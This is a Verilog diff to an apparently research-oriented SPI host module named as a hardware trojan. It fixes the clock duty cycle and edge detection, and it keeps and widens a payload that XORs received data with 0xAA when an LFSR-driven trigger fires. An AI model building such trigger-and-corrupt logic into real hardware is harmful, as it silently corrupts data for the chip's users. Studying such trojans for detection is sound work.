@@ -30,6 +30,7 @@ module trojan1_spi_host #(
     reg [2:0] spi_state;
     reg [19:0] r1_lfsr;
     reg sclk_enable;
+    reg sclk_prev;
     
     // R1 signal generation using LFSR
     always @(posedge clk or posedge rst) begin
@@ -41,24 +42,36 @@ module trojan1_spi_host #(
     
     assign trojan_r1 = r1_lfsr[0];
     
-    // SPI clock generation
+    // SPI clock generation with proper 50% duty cycle
     always @(posedge clk or posedge rst) begin
         if (rst) begin
             clk_counter <= {$clog2(CLK_DIV){1'b0}};
             spi_sclk <= 1'b0;
         end else if (sclk_enable) begin
-            if (clk_counter >= $clog2(CLK_DIV)'(CLK_DIV-1)) begin
+            // Toggle clock every CLK_DIV/2 cycles for 50% duty cycle
+            if (clk_counter >= $clog2(CLK_DIV)'((CLK_DIV/2)-1)) begin
                 clk_counter <= {$clog2(CLK_DIV){1'b0}};
                 spi_sclk <= ~spi_sclk;
             end else begin
                 clk_counter <= clk_counter + 1;
             end
         end else begin
+            clk_counter <= {$clog2(CLK_DIV){1'b0}};
             spi_sclk <= 1'b0;
         end
     end
     
-    wire sclk_edge = sclk_enable && (clk_counter == $clog2(CLK_DIV)'(CLK_DIV-1));
+    // Separate sclk_prev update for stable edge detection
+    always @(posedge clk or posedge rst) begin
+        if (rst) begin
+            sclk_prev <= 1'b0;
+        end else begin
+            sclk_prev <= spi_sclk;
+        end
+    end
+    
+    wire sclk_rising = sclk_enable && !sclk_prev && spi_sclk;
+    wire sclk_falling = sclk_enable && sclk_prev && !spi_sclk;
     
     // SPI state machine
     always @(posedge clk or posedge rst) begin
@@ -86,10 +99,10 @@ module trojan1_spi_host #(
                     spi_state <= 3'b010;
                 end
                 3'b010: begin // TRANSFER
-                    if (sclk_edge && spi_sclk) begin // Rising edge
+                    if (sclk_rising) begin // Rising edge - output data
                         spi_mosi <= tx_shift_reg[DATA_WIDTH-1];
                         tx_shift_reg <= tx_shift_reg << 1;
-                    end else if (sclk_edge && !spi_sclk) begin // Falling edge
+                    end else if (sclk_falling) begin // Falling edge - sample and count
                         rx_shift_reg <= {rx_shift_reg[DATA_WIDTH-2:0], spi_miso};
                         if (bit_counter >= $clog2(DATA_WIDTH)'(DATA_WIDTH-1)) begin
                             spi_state <= 3'b011;
@@ -115,8 +128,12 @@ module trojan1_spi_host #(
             rx_data <= {DATA_WIDTH{1'b0}};
             rx_valid <= 1'b0;
         end else if (tx_done) begin
-            // Mix received data with trojan trigger
-            rx_data <= rx_shift_reg ^ (trojan_trigger ? 8'hAA : 8'h00);
+            // Mix received data with trojan trigger (proper width handling)
+            if (DATA_WIDTH >= 8) begin
+                rx_data <= rx_shift_reg ^ (trojan_trigger ? {{(DATA_WIDTH-8){1'b0}}, 8'hAA} : {DATA_WIDTH{1'b0}});
+            end else begin
+                rx_data <= rx_shift_reg ^ (trojan_trigger ? {DATA_WIDTH{1'b1}} : {DATA_WIDTH{1'b0}});
+            end
             rx_valid <= 1'b1;
         end else begin
             rx_valid <= 1'b0;
